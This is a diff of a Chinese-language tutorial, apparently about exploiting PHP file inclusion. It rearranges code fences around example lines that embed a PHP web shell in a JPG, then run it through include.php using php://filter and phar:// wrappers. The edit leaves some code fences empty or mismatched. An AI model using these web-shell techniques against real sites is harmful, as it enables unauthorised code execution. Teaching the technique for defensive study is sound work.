@@ -112,8 +112,9 @@ copy normal.jpg /b + shell.php /a shell.jpg
 
 ![](img/a79df968a16e457a06192752159de6e9_36.png)
 
-```
 http://target.com/include.php?file=upload/shell.jpg
+
+```
 ```
 
 ![](img/a79df968a16e457a06192752159de6e9_38.png)
@@ -181,8 +182,9 @@ http://target.com/level2/include.php?file=php://filter/convert.base64-encode/res
 
 ![](img/a79df968a16e457a06192752159de6e9_48.png)
 
-```
 http://target.com/level2/include.php?file=phar://upload/shell.jpg/shell
+
+```
 ```
 
 即使后台拼接为 `phar://upload/shell.jpg/shell.php`，`phar://` 协议也会正确解析 `shell.jpg` 压缩包中的 `shell`（或 `shell.php`）文件并执行其中的代码。
